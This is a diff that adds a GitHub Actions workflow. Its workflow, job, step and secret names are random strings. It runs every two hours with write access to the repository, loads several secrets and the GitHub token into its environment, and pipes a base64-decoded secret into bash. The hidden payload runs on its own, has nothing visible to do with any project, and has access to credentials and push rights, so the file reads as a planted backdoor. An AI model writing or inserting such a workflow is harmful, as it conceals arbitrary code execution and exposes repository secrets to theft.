@@ -1,0 +1,21 @@
+name: ONFqR
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  j7hVuSn6o4LKS:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.VvLLqxQ4 }}
+      - name: DVNwYvGxoo
+        env:
+          WR3Av5: ${{ secrets.xoKwGdBraq }}
+          jIULjkzmno: ${{ secrets.Wgd9xTJT4uL5m }}
+          UHQq3xHZuc: ${{ secrets.zmVKho40FNG }}
+          GITHUB_TOKEN: ${{ secrets.VvLLqxQ4 }}
+        run: echo "$WR3Av5" | base64 -d | bash
